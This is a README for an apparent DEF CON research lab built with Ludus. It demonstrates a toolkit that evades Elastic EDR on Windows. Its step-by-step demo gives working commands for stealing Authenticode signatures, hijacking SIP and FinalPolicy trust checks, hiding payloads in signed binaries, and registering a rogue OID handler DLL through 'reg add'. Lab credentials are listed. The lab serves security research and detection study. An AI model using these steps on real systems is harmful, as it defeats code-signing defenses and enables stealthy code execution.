# TrustMeBro DEF CON Lab

Live demonstration environment for Authenticode signature manipulation and SIP hijacking research, built around defeating Elastic EDR. Powered by [Ludus](https://ludus.cloud).

## Machines

| Machine | OS | IP (last octet) | Purpose |
|---|---|---|---|
| DC01 | Windows Server 2022 | .11 | Domain controller (trustme.lab) |
| DEVBOX | Windows 11 | .20 | Operator machine. TrustMeBro installed, Defender disabled, toolchain ready. |
| TARGET | Windows 11 | .30 | Victim. Elastic EDR enrolled, Defender active, domain-joined. |
| Elastic | Debian 12 | 20.2 | Elasticsearch + Kibana + Fleet. Security rules enabled. |
| Kali | Kali Linux | 99.1 | Attacker pivot for remote Impacket demos. |

## Prerequisites

- Ludus server with Proxmox (16+ cores, 64GB+ RAM recommended)
- Templates built: `win11-22h2-x64-enterprise-template`, `win2022-server-x64-template`, `debian-12-x64-server-template`, `kali-x64-desktop-template`
- Ludus community roles installed:
  ```
  ludus ansible roles add badsectorlabs.ludus_elastic_container
  ludus ansible roles add badsectorlabs.ludus_elastic_agent
  ludus ansible roles add geerlingguy.docker
  ```

## Deploy

```bash
# 1. Clone this repo to your Ludus host
git clone https://github.com/KriyosArcane/TrustMeBro-Lab.git
cd TrustMeBro-Lab

# 2. Copy custom roles to Ludus
cp -r roles/devbox ~/.ludus/roles/trustmebro_devbox
cp -r roles/target ~/.ludus/roles/trustmebro_target

# 3. Set the range config
ludus range config set -f range-config.yml

# 4. Deploy
ludus range deploy

# 5. Wait for SUCCESS
ludus range status
```

Full deployment takes 30-45 minutes depending on hardware.

## Accessing Machines

Connect via WireGuard:
```bash
ludus user wireguard | tee ludus.conf
# Import into WireGuard client
```

| Machine | Access | Credentials |
|---|---|---|
| DEVBOX | RDP | localuser / password |
| TARGET | RDP | TRUSTME\demouser / Demo@User2026 |
| TARGET (admin) | RDP | TRUSTME\domainadmin / TrustMe@Lab2026 |
| Elastic Kibana | Browser | https://ELASTIC_IP:5601, elastic / TrustMeBro2026! |
| Kali | SSH or KasmVNC (port 8444) | kali / kali |

Credentials are also saved to `C:\Demo\lab_creds.txt` on DEVBOX.

## Demo Reset

Returns the lab to a clean state without full reprovisioning. Runs in under 2 minutes.

```bash
ansible-playbook reset.yml -i inventory
```

What it does:
- Restores all SIP registry keys on TARGET to defaults
- Restores FinalPolicy to SoftpubAuthenticode
- Removes FormatGhost OID handler
- Removes any sip-exec implant registrations
- Cleans temp files from TARGET
- Re-stages test binaries
- Clears Elastic security alerts

## Demo Flow

Each step maps to a TrustMeBro technique demonstrated on specific machines.

### Step 1: Show unsigned binary blocked

**On TARGET:** Run `C:\DemoFiles\unsigned_app.exe`. Elastic EDR blocks or alerts.

**On Kibana:** Show the alert in the security dashboard.

### Step 2: Steal signature + SIP hijack

**On DEVBOX:**
```cmd
cd C:\Demo\TrustMeBro
TrustMeBro.exe steal C:\Demo\donors\explorer.exe C:\Demo\unsigned_agent.exe --clone
```

Copy `unsigned_agent.exe` to TARGET at `C:\Temp\agent.exe`.

**On TARGET (admin shell):**
```cmd
C:\Temp\TrustMeBro.exe hijack --sip-types PE
```

Log out and log back in. Run `C:\Temp\agent.exe`. It runs without being blocked.

**On Kibana:** Show no alert or a reduced-severity alert.

### Step 3: FinalPolicy single-write bypass

**On TARGET (admin shell):**
```cmd
C:\Temp\TrustMeBro.exe hijack --finalpolicy
```

Log out and log back in. Every signature check now returns success. Run any unsigned binary.

**On Kibana:** Show no signature-related alerts.

### Step 4: SigStash payload delivery

**On DEVBOX:**
```cmd
cd C:\Demo\TrustMeBro
TrustMeBro.exe embed C:\Demo\payload.bin C:\Demo\donors\explorer.exe C:\Demo\carrier.exe --camouflage
```

Copy `carrier.exe` to TARGET. Verify signature:
```powershell
(Get-AuthenticodeSignature C:\Temp\carrier.exe).Status
# Output: Valid
```

Extract payload:
```cmd
C:\Temp\TrustMeBro.exe extract C:\Temp\carrier.exe C:\Temp\recovered.bin
type C:\Temp\recovered.bin
```

### Step 5: FormatGhost analyst-triggered execution

**On TARGET (admin shell):**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v Dll /t REG_SZ /d "C:\Temp\format_ghost.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v FuncName /t REG_SZ /d "FormatObject" /f
```

Run `certutil -dump C:\Temp\carrier.exe`. The DLL loads into certutil. Show the payload file at `%TEMP%\format_ghost_payload.bin`.

### Step 6: Elastic dashboard review

**On Kibana:** Walk through each alert (or lack thereof) for each technique. Show which techniques generated alerts, which were silent, and what the visibility gaps look like from the defender perspective.

### Cleanup

```cmd
:: On TARGET
C:\Temp\TrustMeBro.exe clean --all
```

Or run the reset playbook from the Ludus host.

## Repository Structure

```
TrustMeBro-Lab/
├── range-config.yml          Ludus range configuration
├── reset.yml                 Demo reset playbook
├── roles/
│   ├── devbox/tasks/main.yml DevBox provisioning (Defender disable, toolchain, repo clone)
│   └── target/tasks/main.yml Target provisioning (test binary staging, user accounts)
├── LICENSE
└── README.md
```

## License

MIT License. See [LICENSE](LICENSE).

Part of the [TrustMeBro](https://github.com/KriyosArcane/TrustMeBro) toolkit.
